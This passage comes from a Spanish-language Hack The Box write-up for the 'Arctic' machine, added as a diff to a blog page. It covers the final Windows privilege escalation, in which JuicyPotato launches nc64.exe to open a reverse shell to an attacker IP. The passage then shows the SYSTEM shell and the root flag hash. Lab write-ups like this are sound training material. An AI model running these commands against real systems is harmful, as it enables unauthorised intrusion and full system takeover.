+  <li>Con <code>-a</code> le pasaremos el argumentos, donde le pasaremos la ruta donde recide el <code>nc64.exe</code> para enviarnos una consola interactiva</li>
+</ul>
+
+<p>Nos ponemos en escucha en nuestro equipo y proseguimos a ejecutarlo, si vemos que no nos hace nada, hay que ejecutarlo varias veces.</p>
+
+<pre><code class="language-cmd">.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc64.exe -e cmd 10.10.16.8 443"
+.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc64.exe -e cmd 10.10.16.8 443"
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+....
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+
+C:\Windows\Temp\PRIVESC&gt;
+</code></pre>
+
+<p>Y recibimos la conexión</p>
+
+<pre><code class="language-bash">❯ rlwrap ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.11.
+Ncat: Connection from 10.10.10.11:49816.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+whoami
+whoami
+nt authority\system
+</code></pre>
+
+<p>Lo unico que nos queda por hacer es dirigirnos al directorio personal del usuario <code>administrator</code> y visualizamos la segunda flag <code>root.txt</code> :)</p>
+
+<pre><code class="language-cmd">cd C:\Users\Administrator\Desktop
+cd C:\Users\Administrator\Desktop
+
+type root.txt
+type root.txt
+4804d15552ecad867e5f3b60985e1d34
+
+C:\Users\Administrator\Desktop&gt;
+</code></pre>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Arctic - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Arctic" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
